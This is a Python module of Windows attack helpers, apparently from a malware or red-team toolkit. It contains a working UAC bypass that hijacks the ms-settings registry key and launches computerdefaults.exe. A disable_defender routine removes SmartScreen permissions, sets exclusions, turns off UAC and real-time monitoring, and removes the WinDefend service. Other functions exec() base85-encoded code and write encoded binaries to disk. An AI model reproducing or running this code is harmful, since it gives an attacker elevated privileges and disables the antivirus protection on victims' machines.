import winreg
import sys
import os
import subprocess
import ctypes
import base64
import platform

# Exploit to bypass UAC
def exploit(path, program):
	DEFAULT_REGISTRY_KEY	=	None
	try:
		#prog = os.path.basename(sys.argv[0])
		#path = os.path.dirname(sys.argv[0])+"/"
		# Create The DelegateExecute Key
		create_reg_key	(winreg.HKEY_CURRENT_USER,
						path,
						'DelegateExecute',
						winreg.REG_SZ,
						'')

		# Create the Registry key that will exploit
		create_reg_key	(winreg.HKEY_CURRENT_USER,
						path,
						DEFAULT_REGISTRY_KEY,
						winreg.REG_SZ,
						program)

		# Now we should execute
		print("Try to execute elevate")
		subprocess.run([r'C:\Windows\System32\computerdefaults.exe'], shell=True)

		# Now we can clean up our registry.
		delete_key	(winreg.HKEY_CURRENT_USER,
					r'Software\Classes\ms-settings')
	except OSError as error:
		print('error: {} Unable to complete the UAC bypass'.format(error))
		sys.exit(1)

# Disabled Windows Defender
def disable_defender():
	is_wow64 = (platform.architecture()[0] == '32bit' and 'ProgramFiles(x86)' in os.environ)
	system_path = os.path.join(os.environ['SystemRoot'], 'SysNative' if is_wow64 else 'System32')+"\\"
	print("Disabling smartscreen...")
	subprocess.run	(["nsudo.exe", "-U:T", "-ShowWindowMode:Hide", "icacls",
					"{}\\smartscreen.exe".format(system_path), "/inheritance:r", "/remove",
					"*S-1-5-32-544", "*S-1-5-11", "*S-1-5-32-545", "*S-1-5-18"], shell=True)

	# Then we'll suppress notifications from Defender
						# Define the root
	create_reg_key	(winreg.HKEY_LOCAL_MACHINE,
						# Our Path to Create
						r'Software\Policies\Microsoft\Windows Defender\UX Configuration',
						# Our Key or "Name"
						'Notification_Suppress',
						# What is our Type
						winreg.REG_DWORD,
						# And its Value
						1)
	print("Disabling Defender...")
	subprocess.run(["powershell.exe", "-command", "Add-MpPreference", "-ExclusionExtension", ".exe"], shell=True)
	subprocess.run(["powershell.exe", "-inputformat", "none", "-outputformat", "none", "-NonInteractive",
					"-Command", "Add-MpPreference", "-ExclusionPath",
					r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"], shell=True)
	
	create_reg_key	(winreg.HKEY_LOCAL_MACHINE,
						# Our Path to Create
						r'Software\Microsoft\Windows\CurrentVersion\policies\system',
						# Our Key or "Name"
						'EnableLUA',
						# What is our Type
						winreg.REG_DWORD,
						# And its Value
						0)
	Set_MpPreference	=	{
							"-DisableRealtimeMonitoring":"$true",
							"-HighThreatDefaultAction":"6 -Force",
							"-ModerateThreatDefaultAction":"6",
							"-LowThreatDefaultAction":"6",
							"-SevereThreatDefaultAction":"6",
							"-ScanScheduleDay":"8",
							"-SubmitSamplesConsent":"2",
							"-DisableBlockAtFirstSeen":"$true",
							"-DisableIOAVProtection":"$true",
							"-DisablePrivacyMode":"$true",
							"-SignatureDisableUpdateOnStartupWithoutEngine":"$true",
							"-DisableArchiveScanning":"$true",
							"-DisableIntrusionPreventionSystem":"$true",
							"-DisableScriptScanning":"$true",
							"-MAPSReporting":"0",
							"-PUAProtection":"disable"
							}

	for k, v in Set_MpPreference.items():
		print("Running: {} {}".format(k, v))
		subprocess.run(["powershell.exe", "-command", "Set-MpPreference", "{}".format(k), "{}".format(v)], shell=True)
	subprocess.run(["nsudo.exe", "-U:T", "nssm.exe", "remove", "windefend", "confirm"], shell=True)
	print("Finished Disabling Defender")

# Executes obfuscated code
def bin85(encoded):
	exec(base64.b85decode(encoded))

# Creates a registry Key
def create_reg_key(hkey, path, key, type, value):
	try:
		winreg.CreateKey(hkey, path)
		with winreg.OpenKey(hkey, path, 0, winreg.KEY_WRITE) as registry_key:
			winreg.SetValueEx(registry_key, key, 0, type, value)
	except OSError as error:
			print('error creating keys: {}'.format(error))
			sys.exit(1)

# Deletes keys and subkeys recursively
def delete_key(hkey, path):
	try:
		with winreg.OpenKey(hkey, path, 0, winreg.KEY_ALL_ACCESS) as open_key:
			info_key = winreg.QueryInfoKey(open_key)
			for x in range(0, info_key[0]):
				# NOTE:: This code is to delete the key and all sub_keys.
				# If you just want to walk through them, then
				# you should pass x to EnumKey. sub_key = winreg.EnumKey(open_key, x)
				# Deleting the sub_key will change the sub_key count used by EnumKey.
				# We must always pass 0 to EnumKey so we
				# always get back the new first sub_key.
				sub_key = winreg.EnumKey(open_key, 0)
				try:
					winreg.DeleteKey(open_key, sub_key)
					print("Removed {}\\{}".format(path, sub_key))
				except OSError:
					delete_key(hkey, "\\".join([path,sub_key]))
					# No extra delete here since each call
					# to delete_sub_key will try to delete itself when its empty.
			winreg.DeleteKey(open_key, "")
		print("Removed {}".format(path))
		return
	except OSError as error:
		print('error creating keys: {}'.format(error))
		sys.exit(1)

# Writes a base85 encoded binary to disk.
def write_bin(filename, base85):
	with open(filename, 'wb') as file:
		print("Writing '{}' to disk".format(filename))
		file.write(base64.b85decode(base85))

# Simply returns true if we're admin
def admin():
	try: 
		is_admin = os.getuid() == 0
	except AttributeError:
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
	return is_admin

### Print Tools ###

# Disable
def blockPrint():
    sys.stdout = open(os.devnull, 'w')

# Restore
def enablePrint():
    sys.stdout = sys.__stdout__

# Always will print
def alwaysPrint(message):
    sys.__stdout__.write(message+'\n')

# Verbose Printing
class PrintVerbose():
    def __init__(self, verbose):
        self.verbose = verbose

    def vprint(self, message):
        self.verbose
        if self.verbose is True:
            print(message)